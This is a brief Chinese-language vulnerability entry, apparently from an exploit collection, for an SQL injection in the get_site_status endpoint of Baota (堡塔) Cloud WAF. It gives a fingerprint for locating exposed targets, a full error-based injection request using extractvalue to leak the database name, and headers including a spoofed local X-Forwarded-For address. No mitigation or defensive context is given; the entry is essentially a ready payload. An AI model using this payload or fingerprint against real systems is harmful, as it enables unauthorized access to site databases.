# 堡塔云WAF-get_site_status存在SQL注入漏洞

- **系统**：堡塔云　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=="404 - Website not exist!"`
- **请求**：`GET /get_site_status?server_name='-extractvalue(1,concat(0x5c,database()))-'1 HTTP/2`
- **关键头**：`X-Forwarded-For: 127.0.0.1`　`Sec-Fetch-User: ?1`